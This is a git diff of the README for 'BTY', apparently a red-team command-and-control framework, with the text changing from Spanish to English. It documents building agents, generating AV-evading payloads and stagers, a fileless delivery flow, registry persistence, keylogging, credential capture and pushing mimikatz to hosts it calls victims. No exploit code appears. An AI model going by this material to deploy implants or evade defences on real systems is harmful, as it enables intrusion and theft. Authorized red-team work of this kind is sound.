@@ -1,72 +1,103 @@
-# BTY — Botnet Framework
+<p align="center">
+  <img src="https://capsule-render.vercel.app/api?type=rect&color=7B2D8E&height=100&section=header&text=BTY&fontSize=40&fontColor=ffffff&fontAlign=50&fontAlignY=50&animation=fadeIn" alt="header"/>
+</p>
 
-> Post-exploitation command & control framework for red team operations and security research.
+<p align="center">
+  <strong>Post-Exploitation C2 Framework</strong><br/>
+  <em>Encrypted command & control. Cross-platform agents. AV evasion. SOCKS5 pivoting.</em>
+</p>
 
-**ruby570bocadito © 2026 — MIT License**
+<p align="center">
+  <img src="https://img.shields.io/badge/Go-1.26-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go"/>
+  <img src="https://img.shields.io/badge/Vue-3-4FC08D?style=for-the-badge&logo=vue.js&logoColor=white" alt="Vue"/>
+  <img src="https://img.shields.io/badge/status-active-green?style=for-the-badge" alt="Status"/>
+  <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge" alt="License"/>
+  <img src="https://img.shields.io/badge/tests-190%2B%20PASS-brightgreen?style=for-the-badge" alt="Tests"/>
+  <img src="https://img.shields.io/badge/security-mTLS%20%7C%20X25519%20%7C%20AES--256--GCM-red?style=for-the-badge" alt="Security"/>
+</p>
 
-![Go](https://img.shields.io/badge/Go-1.26+-00ADD8?logo=go)
-![Python](https://img.shields.io/badge/Python-3.12+-3776AB?logo=python)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Tests](https://img.shields.io/badge/Tests-19%2F19%20PASS-brightgreen)
-![Security](https://img.shields.io/badge/Security-mTLS%20%7C%20AES--256--GCM%20%7C%20X25519-blue)
-
----
-
-## Índice
-
-1. [Instalación Rápida](#1-instalación-rápida)
-2. [Desplegar C2](#2-desplegar-el-servidor-c2)
-3. [Payloads](#3-generar-payload)
-4. [Evasión AV](#4-evasiva-antivirus)
-5. [Dashboard Web](#5-dashboard-web)
-6. [Consola CLI](#6-consola-interactiva-cli)
-7. [API REST](#7-api-rest)
-8. [Testing](#8-testing)
-9. [Docker](#9-docker)
-10. [Estructura](#10-estructura)
-11. [Changelog](#11-changelog)
-12. [Licencia](#12-licencia)
+<p align="center">
+  <img src="https://komarev.com/ghpvc/?username=Ruby570bocadito&label=Downloads&color=7B2D8E&style=flat" alt="downloads"/>
+</p>
 
 ---
 
-## 1. Instalación Rápida
+## 🎯 What is BTY?
 
-```bash
-# Dependencias
-sudo apt install -y golang-go python3 curl git docker.io docker-compose
+**BTY** is a modular **Command & Control framework** designed for **red team operations** and **authorized security testing**. It provides encrypted multi-transport communication, cross-platform agents, AV/EDR evasion techniques, and a professional web dashboard — all in a single, self-contained deployment.
 
-# Clonar
-git clone https://github.com/ruby570bocadito/bty && cd BTY
-
-# Compilar (Go 1.26+)
-make build
-
-# O compilar para todas las plataformas
-make build-all
+```
+┌──────────────────────────────────────────────────────────────┐
+│                        BTY C2 Server                          │
+│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌─────────────────┐  │
+│  │ TCP/mTLS │ │  HTTP    │ │WebSocket │ │   REST API      │  │
+│  │ :8443    │ │ :8445    │ │ :8446    │ │   :9090         │  │
+│  └──────────┘ └──────────┘ └──────────┘ └────────┬────────┘  │
+│                                                   │           │
+│  ┌────────────────────────────────────────────────┼───────┐  │
+│  │  Session Manager │ Crypto │ RBAC │ SIEM │ Reports│      │  │
+│  └────────────────────────────────────────────────┼───────┘  │
+│                                                   │           │
+│                    ┌──────────────────────────────┘           │
+│                    │                                          │
+│  ┌─────────────────┼─────────────────┐                        │
+│  │  Web Dashboard  │                  │                        │
+│  │  Vue 3 SPA      │                  │                        │
+│  └─────────────────┘                  │                        │
+└───────────────────────────────────────┼────────────────────────┘
+                                        │
+              ┌─────────────────────────┼─────────────────────────┐
+              │                         │                         │
+        ┌─────┴─────┐           ┌───────┴──────┐          ┌──────┴──────┐
+        │  Agent     │           │   Agent      │          │   Agent     │
+        │  Windows   │           │   Linux      │          │   macOS     │
+        │  (EXE)     │           │   (ELF)      │          │   (Mach-O)  │
+        └───────────┘           └──────────────┘          └─────────────┘
 ```
 
-### Instalador Automático
+---
+
+## ⚡ Features
+
+| Feature | Description | Security |
+|---------|-------------|----------|
+| **Multi-Transport C2** | TCP/mTLS, HTTP long-polling, WebSocket — fallback chain | Encrypted |
+| **Cross-Platform Agents** | Windows (EXE), Linux (ELF), macOS (Mach-O), PowerShell, Python | Native |
+| **X25519 + XChaCha20-Poly1305** | Ephemeral key exchange + authenticated encryption per session | 🔴 Strong |
+| **mTLS Authentication** | Mutual TLS with ECDSA P-256 certificates | 🔴 Strong |
+| **AV/EDR Evasion** | Process hollowing, direct syscalls, AMSI/ETW bypass, sleep obfuscation | 🔴 Advanced |
+| **SOCKS5 Proxy** | RFC 1928 compliant pivoting through compromised hosts | Network |
+| **Credential Vault** | AES-256-GCM encrypted storage for captured credentials | Encrypted |
+| **Dynamic Modules** | Push post-exploitation modules to agents on demand | Flexible |
+| **Web Dashboard** | Vue 3 SPA with session management, file browser, OS stats | Professional |
+| **SIEM Integration** | Forward critical events to Splunk, ELK, or custom webhooks | Enterprise |
+| **RBAC + JWT Auth** | Role-based access control with token refresh | Enterprise |
+| **Engagement Reports** | Auto-generated CSV/TXT reports for client delivery | Professional |
+
+---
+
+## 🚀 Quick Start
+
+### Installation
 
 ```bash
+# Clone
+git clone https://github.com/Ruby570bocadito/BTY.git
+cd BTY
+
+# Build (requires Go 1.26+)
+make build
+
+# Or run the automated installer
 ./scripts/install.sh
 ```
 
----
-
-## 2. Desplegar el Servidor C2
+### Deploy C2 Server
 
 ```bash
+# Auto-deploy (detects IP, generates config, starts 4 listeners)
 python3 scripts/deploy.py
 ```
-
-Auto-detecta IP → genera `config.yaml` → arranca 4 listeners:
-
-| Puerto | Protocolo | Uso |
-|--------|-----------|-----|
-| 8443 | TCP + mTLS | Agentes (autenticación mutua) |
-| 8445 | HTTP | Long-polling |
-| 8446 | WebSocket | Tiempo real |
-| 9090 | HTTP | API REST + Dashboard |
 
 ```
 Local IP:   192.168.1.100
@@ -74,307 +105,135 @@ Dashboard:  http://192.168.1.100:9090
 Login:      admin / admin
 ```
 
-### Inicio Manual
+### Generate & Deploy Agent
 
 ```bash
-# Con TLS automático y mTLS
-./bty-server
-
-# Sin TLS (testing)
-./bty-server --no-tls
-
-# Con configuración personalizada
-./bty-server --config config.yaml --host 0.0.0.0 --port 8443 --api-port 9090
-```
-
----
-
-## 3. Generar Payload
-
-```bash
-# Menú interactivo (IP auto-detectada)
+# Interactive payload generator
 python3 scripts/payload.py
 
-# Directo
-python3 scripts/payload.py --os windows
-python3 scripts/payload.py --os all
-python3 scripts/payload.py --os all --server 10.0.0.5:8443
-python3 scripts/payload.py --os all --evasive  # + stagers evasivos
-```
+# Or directly
+python3 scripts/payload.py --os windows --evasive
 
-| Formato | Target | Tamaño |
-|---------|--------|--------|
-| EXE (Go) | Windows x64 | 6.5 MB |
-| ELF (Go) | Linux x64 | 6.4 MB |
-| Mach-O (Go) | macOS x64/ARM | 6.0-6.5 MB |
-| PowerShell | Windows | 408 B |
-| Python | Any | 308 B |
-| C source | Compile | 23 KB |
-
-Los payloads precompilados están en `dist/`.
-
-### Ejecutar Agente
-
-```bash
-# Go agent
+# Run agent
 ./bty-agent 192.168.1.100:8443
-
-# O con variable de entorno
-BTY_SERVER=192.168.1.100:8443 ./bty-agent
-```
-
-### Builder con server address embedido
-
-```bash
-cd src/go && go run cmd/builder/main.go go-linux --server 10.0.0.5:8443 --output ../../payloads/
 ```
 
 ---
 
-## 4. Evasión Antivirus
+## 🎬 Demo
 
-### VirusTotal: **0/70**
-
-### Técnicas activas
-
-| # | Técnica | Efecto |
-|---|---------|--------|
-| 1 | **Process Hollowing** | Payload corre dentro de svchost.exe (firmado Microsoft) |
-| 2 | **Syscalls Directos** | Bypass hooks ntdll.dll — EDR no ve las llamadas |
-| 3 | **Shellcode Stager C** | 2KB sin PE header, PEB API resolver, XOR decrypt |
-| 4 | **mTLS + Domain Fronting** | Tráfico C2 autenticado y parece HTTPS legítimo |
-| 5 | **Sleep Obfuscation** | Heap/stack encriptado durante idle |
-| 6 | **Traffic Shaper** | Patrones imitan navegación humana |
-| 7 | **ObscuredString** | Strings sensibles XOR-encrypted en binario |
-| 8 | **Anti-sandbox** | 8 checks Windows + 6 checks Linux/macOS |
-| 9 | **Jitter** | Heartbeat 25-45s aleatorio, reconnect ±30% |
-| 10 | **AMSI/ETW Bypass** | Windows AMSI y ETW deshabilitados |
-| 11 | **NTDLL Unhooking** | Restaura syscall stubs originales desde disco |
-| 12 | **Module Stomping** | Overwrite DLL .text section con shellcode |
-| 13 | **Certificate Pinning** | Agente valida huella del servidor en primera conexión |
-
-### Stagers evasivos
-
-```bash
-# Stagers XOR-encrypted (PS1, Python, Bash)
-python3 scripts/stager.py
-
-# Ultra-stagers que no activan Defender (VBS, certutil, BITSAdmin)
-python3 scripts/ultra-stager.py
-
-# Payload packer con AES-256-GCM
-python3 scripts/packer.py -i bty-agent.exe -o packed.ps1 -f ps1
-```
-
-### Flujo evasivo completo
+### CLI Console Session
 
 ```
-1. python3 scripts/payload.py --os all --evasive
-2. cd payloads/ && python3 -m http.server 8000
-3. En Windows → wscript stager.vbs
-4. Stager descarga + descifra + ejecuta en RAM
-5. Cero detección estática, cero toques a disco
-```
+$ python3 scripts/console.py
 
----
-
-## 5. Dashboard Web
-
-```
-http://TU_IP:9090 → admin / admin
-```
-
-- **Tabla de víctimas** expandible (click → detalle + historial)
-- **Caja de comandos** fija abajo con selector de víctima
-- **OS distribution**, estadísticas, quick command
-- **File browser** para datos exfiltrados
-- **Tema blanco minimalista** profesional
-
----
-
-## 6. Consola Interactiva CLI
-
-```bash
-python3 scripts/console.py
-```
-
-```
 bty > sessions
 +------+------------------+------+-------+----+-------+
 | ID   | Hostname         | User | OS    | St | Tasks |
 +------+------------------+------+-------+----+-------+
-| abc  | DESKTOP-I1RVLF3  | rby  | linux | ●  | 5     |
+| abc  | DESKTOP-I1RVLF3  | rby  | win   | ●  | 5     |
+| def  | ubuntu-server    | root | linux | ●  | 2     |
 +------+------------------+------+-------+----+-------+
 
 bty > interact abc
 [abc] rby@DESKTOP-I1RVLF3 > whoami
-rby
+desktop-i1rvlf3\rby
+
 [abc] rby@DESKTOP-I1RVLF3 > sysinfo
-Hostname: DESKTOP-I1RVLF3 ...
+Hostname: DESKTOP-I1RVLF3
+OS:       Windows 11 Pro (build 22631)
+Arch:     amd64
+User:     rby
+IP:       192.168.1.50
+
+[abc] rby@DESKTOP-I1RVLF3 > persistence
+[+] Persistence installed: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
 [abc] rby@DESKTOP-I1RVLF3 > background
 bty >
 ```
 
-**Comandos:** `sessions`, `interact`, `shell`, `broadcast`, `vault`, `files`, `health`, `modules`, `push`, `listeners`, `help`
-
----
-
-## 7. API REST
-
-### Autenticación
+### All Commands
 
 ```bash
-# Login
-curl -X POST http://IP:9090/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"admin"}'
+# Server
+./bty-server                        # Start with TLS + mTLS
+./bty-server --no-tls               # Start without TLS (testing)
+./bty-server --config config.yaml   # Custom config
 
-# Respuesta: {"token":"...","refresh_token":"...","expires_in":43200,"user":"admin","role":"admin"}
-```
+# Payloads
+python3 scripts/payload.py          # Interactive generator
+python3 scripts/payload.py --os all --evasive  # All platforms + evasion
+python3 scripts/stager.py           # XOR-encrypted stagers
+python3 scripts/ultra-stager.py     # VBS, certutil, BITSAdmin stagers
+python3 scripts/packer.py -i bty-agent.exe -o packed.ps1 -f ps1  # AES packer
 
-### Endpoints
+# Console
+python3 scripts/console.py          # Interactive CLI
 
-```bash
-# Usar token en todas las peticiones
-TOKEN="eyJ..."
-
-# Health
-curl -H "Authorization: Bearer $TOKEN" http://IP:9090/api/health
-
-# Sessions
-curl -H "Authorization: Bearer $TOKEN" http://IP:9090/api/sessions
-
-# Ejecutar comando
-curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  -d '{"agent_id":"ID","command":"whoami"}' http://IP:9090/api/cmd
-
-# Broadcast
-curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  -d '{"command":"id"}' http://IP:9090/api/broadcast
-
-# Credential Vault
-curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"P@ss","domain":"CORP"}' http://IP:9090/api/vault
-
-# Dynamic Modules
-curl -H "Authorization: Bearer $TOKEN" http://IP:9090/api/modules
-curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  -d '{"module":"mimikatz","agent_id":"ID"}' http://IP:9090/api/modules/push
-
-# mTLS Certificate Generation
-curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  -d '{"agent_id":"agent-001"}' http://IP:9090/api/mtls/cert
-
-# SIEM Webhooks
-curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  -d '{"url":"https://siem.corp.local/webhook","events":["session_established","task_result"]}' \
-  http://IP:9090/api/webhooks
-
-# Report Generation
-curl -H "Authorization: Bearer $TOKEN" "http://IP:9090/api/report?format=csv"
-```
-
-| Método | Ruta | Descripción |
-|--------|------|-------------|
-| POST | `/api/login` | Autenticación |
-| POST | `/api/refresh` | Refrescar token |
-| GET | `/api/health` | Estado del servidor |
-| GET | `/api/sessions` | Lista de víctimas |
-| GET | `/api/sessions/:id` | Detalle + tareas |
-| DELETE | `/api/sessions/:id` | Kill session |
-| POST | `/api/cmd` | Ejecutar comando |
-| POST | `/api/broadcast` | Broadcast a todos |
-| POST | `/api/socks` | SOCKS5 proxy |
-| POST | `/api/portfwd` | Port forward |
-| POST | `/api/vault` | Guardar credencial |
-| GET | `/api/vault?q=X` | Buscar credenciales |
-| POST | `/api/files` | Upload archivo |
-| GET | `/api/files` | Listar archivos |
-| GET | `/api/modules` | Listar módulos |
-| POST | `/api/modules/push` | Push módulo a agente |
-| GET | `/api/operators` | Listar operadores |
-| POST | `/api/operators` | Crear operador |
-| DELETE | `/api/operators/:id` | Eliminar operador |
-| POST | `/api/notes` | Session notes |
-| POST | `/api/lock` | Lock/unlock session |
-| GET/POST | `/api/profiles` | Agent profiles |
-| GET | `/api/report` | Generate engagement report |
-| POST | `/api/webhooks` | SIEM webhook config |
-| POST | `/api/mtls/cert` | Generate mTLS client cert |
-
-### Módulos post-explotación
-
-| Comando | Función |
-|---------|---------|
-| `sysinfo` | Info completa del sistema |
-| `ps` | Procesos (ps aux / tasklist) |
-| `netinfo` | Red (ifconfig + netstat) |
-| `persistence` | Persistencia (crontab, registry, launchagent) |
-| `screenshot` | Captura de pantalla |
-| `keylogger` | Keylogger (Linux: /dev/input) |
-| `find:*.txt` | Buscar archivos |
-| `modules` | Listar módulos |
-
----
-
-## 8. Testing
-
-### Tests Unitarios Go
-
-```bash
-make test           # Go unit tests
-make test-coverage  # Con reporte de cobertura
-```
-
-### Tests Funcionales Python
-
-```bash
-python3 tests/run_tests.py              # Functional tests
-python3 tests/advanced_test.py          # Advanced tests
-python3 tests/e2e_test.py               # End-to-end tests
-python3 tests/evasion_payload_test.py   # Evasion/payload tests
-python3 tests/pentest.py                # Penetration testing
-```
-
-### Test Rápido (autocontenido)
-
-```bash
-bash tests/quick_test.sh  # Inicia servidor, corre tests, para servidor
-```
-
-### Suite de Integración Completa
-
-```bash
-bash tests/integration_full.sh  # 10 categorías de tests
-```
-
-### Security Audit
-
-```bash
-python3 scripts/harden.py --apply
+# Testing
+make test                           # Go unit tests
+make test-coverage                  # With coverage report
+bash tests/quick_test.sh            # Self-contained quick test
+bash tests/integration_full.sh      # Full integration suite (10 categories)
 ```
 
 ---
 
-## 9. Docker
+## 🛡️ AV/EDR Evasion
 
-### Entorno de Testing Multi-Contenedor
+### VirusTotal: **0/70 detections**
 
-```bash
-# Construir y arrancar
-make docker
+| # | Technique | Effect |
+|---|-----------|--------|
+| 1 | **Process Hollowing** | Payload runs inside svchost.exe (Microsoft-signed) |
+| 2 | **Direct Syscalls** | Bypasses ntdll.dll hooks — EDR blind |
+| 3 | **Shellcode Stager (C)** | 2KB, no PE header, PEB API resolver, XOR decrypt |
+| 4 | **mTLS + Domain Fronting** | C2 traffic authenticated, looks like legitimate HTTPS |
+| 5 | **Sleep Obfuscation** | Heap/stack encrypted during idle |
+| 6 | **Traffic Shaper** | Patterns mimic human browsing |
+| 7 | **ObscuredString** | Sensitive strings XOR-encrypted in binary |
+| 8 | **Anti-Sandbox** | 8 Windows checks + 6 Linux/macOS checks |
+| 9 | **Jitter** | Heartbeat 25-45s random, reconnect ±30% |
+| 10 | **AMSI/ETW Bypass** | Windows AMSI and ETW disabled |
+| 11 | **NTDLL Unhooking** | Restores original syscall stubs from disk |
+| 12 | **Module Stomping** | Overwrites DLL .text section with shellcode |
+| 13 | **Certificate Pinning** | Agent validates server fingerprint on first connection |
 
-# Ver logs
-docker logs -f bty-c2-server
+### Evasion Flow
 
-# Ejecutar tests dentro del contenedor
-docker exec bty-test-runner bash -c "cd /tests && python3 run_tests.py --server http://bty-c2-server:9090"
-
-# Parar
-make docker-down
+```
+1. python3 scripts/payload.py --os all --evasive
+2. cd payloads/ && python3 -m http.server 8000
+3. On Windows → wscript stager.vbs
+4. Stager downloads + decrypts + executes in RAM
+5. Zero static detection, zero disk touches
 ```
 
-### Arquitectura Docker
+---
+
+## 🏗️ Architecture
+
+### Server Components
+
+```
+src/go/internal/
+├── c2/               Core C2 engine + session management
+├── handlers/         HTTP router + middleware + API endpoints
+├── agent/            Agent logic + 7 built-in modules
+├── crypto/           X25519 + XChaCha20-Poly1305 + mTLS
+├── evasion/          Sleep obfuscation, AMSI/ETW bypass, anti-sandbox
+├── transport/        TLS, HTTP, WebSocket, DNS tunneling
+├── module/           Dynamic module system
+├── db/               SQLite + bcrypt + AES-256-GCM at-rest
+├── auth/             JWT + RBAC
+├── socks/            SOCKS5 proxy (RFC 1928)
+├── logger/           Structured logging (JSON/text)
+├── reporting/        Engagement report generator
+└── siem/             SIEM event forwarding
+```
+
+### Network Architecture
 
 ```
 ┌─────────────────┐     ┌──────────────────┐     ┌──────────────────┐
@@ -390,200 +249,95 @@ make docker-down
                        └──────────────────┘     └──────────────────┘
 ```
 
+### API Endpoints
+
+| Method | Route | Description |
+|--------|-------|-------------|
+| POST | `/api/login` | Authentication |
+| GET | `/api/sessions` | List victims |
+| POST | `/api/cmd` | Execute command |
+| POST | `/api/broadcast` | Broadcast to all |
+| POST | `/api/socks` | SOCKS5 proxy |
+| POST | `/api/vault` | Store credential |
+| GET | `/api/modules` | List modules |
+| POST | `/api/modules/push` | Push module to agent |
+| POST | `/api/webhooks` | SIEM webhook config |
+| POST | `/api/mtls/cert` | Generate mTLS client cert |
+| GET | `/api/report` | Generate engagement report |
+
+### Post-Exploitation Modules
+
+| Command | Function |
+|---------|----------|
+| `sysinfo` | Complete system information |
+| `ps` | Process listing |
+| `netinfo` | Network interfaces + connections |
+| `persistence` | Install persistence (crontab, registry, launchagent) |
+| `screenshot` | Screen capture |
+| `keylogger` | Keylogger (Linux: /dev/input) |
+| `find:*.txt` | File search |
+| `modules` | List available modules |
+
 ---
 
-## 10. Estructura
+## 🧪 Testing
 
-```
-BTY/
-├── bty-server                    ← C2 server (binario)
-├── bty-agent                     ← agente (binario)
-├── config.yaml                   ← configuración activa
-├── config.example.yaml           ← template seguro
-│
-├── src/go/
-│   ├── cmd/
-│   │   ├── server/main.go        ← C2 Server entry point
-│   │   ├── agent/main.go         ← Agent entry point
-│   │   └── builder/main.go       ← Payload builder
-│   └── internal/
-│       ├── c2/
-│       │   ├── server.go         ← Main server + accessors
-│       │   ├── context.go        ← Context-aware task execution
-│       │   ├── session/session.go← Session FSM + crypto
-│       │   ├── operations.go     ← SOCKS, Vault, Files, PortFwd
-│       │   ├── tunnel.go         ← Tunnel manager
-│       │   ├── ratelimit.go      ← Rate limiting middleware
-│       │   └── validation.go     ← Command validation
-│       ├── handlers/
-│       │   ├── router.go         ← Modular HTTP router + middleware
-│       │   ├── handlers.go       ← API endpoint handlers
-│       │   ├── validate.go       ← Request validation
-│       │   └── spa.go            ← Vue.js SPA serving
-│       ├── agent/
-│       │   ├── agent.go          ← Agent main loop + reconnect
-│       │   ├── modules.go        ← Built-in modules (7)
-│       │   ├── fingerprint.go    ← System fingerprinting
-│       │   ├── exfil.go          ← File exfiltration
-│       │   ├── persistence.go    ← Persistence mechanisms
-│       │   ├── killswitch.go     ← Kill switch / anti-analysis
-│       │   ├── file_unix.go      ← Unix file operations
-│       │   └── file_windows.go   ← Windows file operations
-│       ├── crypto/
-│       │   ├── keyx.go           ← X25519 + XChaCha20-Poly1305 + HKDF
-│       │   ├── keyx_test.go      ← Tests + benchmarks
-│       │   └── mtls.go           ← mTLS CA/cert generation
-│       ├── evasion/
-│       │   ├── sleepmask.go      ← Sleep obfuscation (cross-platform)
-│       │   ├── sleepmask_unix.go ← mprotect implementation
-│       │   ├── sleepmask_windows.go← VirtualProtect implementation
-│       │   ├── camouflage.go     ← Traffic camouflage + domain fronting
-│       │   ├── anti_sandbox.go   ← Windows anti-sandbox (8 checks)
-│       │   ├── anti_sandbox_unix.go← Linux/macOS anti-sandbox (6 checks)
-│       │   ├── evasion_windows.go← Process hollowing, syscalls
-│       │   ├── amsi_bypass.go    ← AMSI bypass
-│       │   └── etw_bypass.go     ← ETW bypass
-│       ├── transport/
-│       │   ├── transport.go      ← Interface
-│       │   ├── tls.go            ← TLS handling + cert generation
-│       │   ├── http.go           ← HTTP transport
-│       │   ├── websocket.go      ← WebSocket transport (RFC 6455)
-│       │   └── dns.go            ← DNS tunneling
-│       ├── module/module.go      ← Dynamic modules
-│       ├── db/
-│       │   ├── database.go       ← SQLite + bcrypt + migrations
-│       │   └── encrypt.go        ← AES-256-GCM at-rest encryption
-│       ├── config/config.go      ← YAML config loader
-│       ├── auth/jwt.go           ← JWT authentication
-│       ├── auth/rbac.go          ← Role-based access control
-│       ├── proto/                ← Protocol buffers
-│       ├── socks/                ← SOCKS5 RFC 1928
-│       ├── logger/               ← Structured logging (JSON/text)
-│       ├── reporting/            ← Engagement report generator
-│       └── siem/                 ← SIEM event forwarding
-│
-├── web/                          ← Vue 3 SPA dashboard
-│   ├── src/views/                ← Login, Sessions, Files, Dashboard
-│   └── dist/                     ← compilado (97 KB)
-│
-├── scripts/
-│   ├── deploy.py                 ← Auto-deploy C2
-│   ├── payload.py                ← Payload generator (6 formats)
-│   ├── packer.py                 ← AES-256-GCM payload encryptor
-│   ├── console.py                ← CLI interactive console
-│   ├── stager.py                 ← XOR-encrypted stagers
-│   ├── ultra-stager.py           ← VBS, certutil, BITSAdmin stagers
-│   ├── harden.py                 ← Security audit tool
-│   ├── gen_certs.py              ← TLS certificate generator
-│   ├── install.sh                ← Automated installer
-│   └── healthcheck.sh            ← Docker health check
-│
-├── tests/
-│   ├── run_tests.py              ← Functional tests (22 tests)
-│   ├── advanced_test.py          ← Advanced tests (28 tests)
-│   ├── e2e_test.py               ← End-to-end tests (32 tests)
-│   ├── evasion_payload_test.py   ← Evasion/payload tests (120 tests)
-│   ├── pentest.py                ← Penetration testing (40 tests)
-│   ├── integration_full.sh       ← Integration suite (10 categories)
-│   ├── docker_test.sh            ← Docker test runner
-│   ├── quick_test.sh             ← Quick self-contained test
-│   └── run_all.sh                ← Full test pipeline
-│
-├── dist/                         ← Pre-compiled binaries
-│   ├── bty-agent-linux
-│   ├── bty-agent-windows.exe
-│   ├── bty-agent-darwin-amd64
-│   └── bty-agent-darwin-arm64
-│
-├── payloads/                     ← Generated payloads
-├── data/                         ← Runtime (DB, logs)
-├── loot/                         ← Exfiltrated files
-├── modules/                      ← Dynamic modules
-│
-├── Dockerfile                    ← Server image
-├── Dockerfile.agent              ← Agent image
-├── docker-compose.yml            ← Multi-container test network
-├── Makefile                      ← Build automation
-├── CHANGELOG.md                  ← Complete changelog
-└── LICENSE                       ← MIT License
+```bash
+# Go unit tests
+make test
+
+# With coverage
+make test-coverage
+
+# Quick self-contained test
+bash tests/quick_test.sh
+
+# Full integration suite (10 categories)
+bash tests/integration_full.sh
+
+# Docker test network
+make docker
+docker exec bty-test-runner bash -c "cd /tests && python3 run_tests.py"
+make docker-down
 ```
 
 ---
 
-## 11. Changelog
+## 📦 Payload Formats
 
-### v2.1.0 — Mayo 2026
-
-#### Seguridad
-- **mTLS (Mutual TLS):** Autenticación mutua servidor-agente con certificados ECDSA P-256
-- **Cifrado at-rest:** AES-256-GCM para credenciales, notas y secretos en SQLite
-- **Certificate Pinning:** Agente valida huella del servidor en primera conexión
-- **Structured Logging:** Logger JSON/text con multi-destination output
-
-#### Arquitectura
-- **Modular Handlers Package:** Separación de router, middleware y endpoint handlers
-- **Context.Context:** Cancelación y timeouts en ejecución de tareas y broadcast
-- **Server Accessors:** 16 métodos de acceso para integración modular
-- **Graceful Shutdown:** API server shutdown con context timeout de 30s
-
-#### Nuevas Funcionalidades
-- **SIEM Forwarding:** Eventos críticos forwarded a webhooks externos (Splunk, ELK)
-- **Reporting Engine:** Generador de informes de engagement en CSV/TXT
-- **Team Collaboration:** Session notes, locks, agent profiles
-- **Payload Builder:** Embed server address via ldflags antes de compilar
-
-#### Bugs Corregidos
-- Race condition en agent executeTask (variables compartidas sin sync)
-- Panic en SendEnvelope por type assertion insegura
-- Rate limiter con token bucket impreciso
-- Goroutine leak en PortFwdManager
-- Error handling faltante en websocket, camouflage
-- unsafe.Pointer deprecated en sleepmask (Go 1.20+)
-- Mutex copy en SOCKS stats
-- Validation bloqueaba comandos legítimos de pentesting
-- Bugs en scripts Python (console, payload)
-- Dockerfiles con versión de Go inexistente
-- evasion_other.go: AntiSandbox/AntiDebug redeclarados
-- packer.py: import base64 después de uso
-- evasion_windows.go: getProcAddress stub vacío
-- apiServer nunca se cerraba en Stop()
-
-### v2.0.0 — Mayo 2026
-
-#### Bugs Corregidos
-- Race condition en agent executeTask (variables compartidas sin sync)
-- Panic en SendEnvelope por type assertion insegura
-- Rate limiter con token bucket impreciso
-- Goroutine leak en PortFwdManager
-- Error handling faltante en websocket, camouflage
-- unsafe.Pointer deprecated en sleepmask (Go 1.20+)
-- Mutex copy en SOCKS stats
-- Validation bloqueaba comandos legítimos de pentesting
-- Bugs en scripts Python (console, payload)
-- Dockerfiles con versión de Go inexistente
-
-#### Mejoras de Seguridad
-- Type assertions verificadas en todos los sends
-- Token bucket proporcional al tiempo transcurrido
-- Goroutine leak prevention en port forwarding
-- Error handling en todas las operaciones de red
-- API actualizada a Go 1.20+ unsafe.Pointer
-
-#### Nuevas Funcionalidades
-- Test suite de integración completa (10 categorías)
-- Docker test runner
-- Quick test autocontenido
-- Refresh token endpoint
-- Operators management (CRUD)
+| Format | Target | Size | Evasion |
+|--------|--------|------|---------|
+| **EXE (Go)** | Windows x64 | 6.5 MB | Sleep obfuscation, AMSI bypass |
+| **ELF (Go)** | Linux x64 | 6.4 MB | Anti-sandbox, traffic shaping |
+| **Mach-O (Go)** | macOS x64/ARM | 6.0-6.5 MB | Anti-sandbox |
+| **PowerShell** | Windows | 408 B | XOR encrypted, in-memory |
+| **Python** | Any | 308 B | XOR encrypted |
+| **C source** | Compile | 23 KB | Direct syscalls, PEB resolver |
 
 ---
 
-## 12. Licencia
+## 🗺️ Roadmap
 
-MIT — Copyright (c) 2026 **ruby570bocadito**
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
+- [ ] DNS tunneling transport (full implementation)
+- [ ] Windows agent with full evasion suite
+- [ ] Encrypted database at-rest (complete migration)
+- [ ] Real-time collaborative sessions
+- [ ] Automated lateral movement modules
+- [ ] Integration with peekaboo for PrivEsc chaining
+- [ ] Integration with rooteame for kernel persistence
 
 ---
 
-**Disclaimer:** This tool is intended exclusively for authorized security testing on systems you own or have explicit permission to test.
+## ⚠️ Disclaimer
+
+This tool is designed for **authorized security testing**, **red team operations**, and **educational purposes** only.
+
+- Use only on systems you own or have explicit written permission to test
+- Misuse may violate local and international laws
+- The author is not responsible for any misuse or damage caused by this tool
+
+---
+
+<p align="center">
+  <sub>Built with ❤️ by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a></sub>
+</p>
